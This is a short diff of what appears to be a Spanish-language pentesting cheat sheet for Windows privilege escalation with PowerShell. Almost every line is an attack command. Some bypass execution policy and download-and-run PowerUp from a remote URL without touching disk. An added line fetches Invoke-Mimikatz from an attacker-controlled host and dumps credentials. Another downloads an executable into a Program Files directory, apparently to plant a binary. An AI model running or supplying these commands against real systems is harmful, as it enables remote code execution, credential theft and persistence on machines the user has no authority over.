@@ -8,7 +8,8 @@ Import-Module PowerUp.ps1
 C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
 
 # Descargar + ejecutar sin tocar el disco
-C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
 
 # Descargas via CLI en windows
 powershell.exe -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
